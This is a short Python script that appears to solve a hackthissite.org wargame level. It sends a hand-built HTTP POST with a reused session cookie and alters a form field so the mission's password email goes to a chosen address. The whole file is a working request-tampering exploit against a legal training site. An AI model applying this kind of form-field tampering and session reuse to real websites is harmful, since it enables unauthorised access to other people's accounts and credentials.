from socket import *

#CHANGE PHPSESSID to current session!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

s = socket(AF_INET, SOCK_STREAM)
s.connect(("hackthissite.org", 80))
s.send("POST /missions/basic/4/level4.php HTTP/1.1\r\nHost: www.hackthissite.org\r\nReferer: http://www.hackthissite.org/missions/basic/4/\r\nCookie: PHPSESSID=tfhk4t929tqmhrclvi36rctas4\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 22\r\n\r\nto=z4nshin%40gmail.com")
print s.recv(1024)

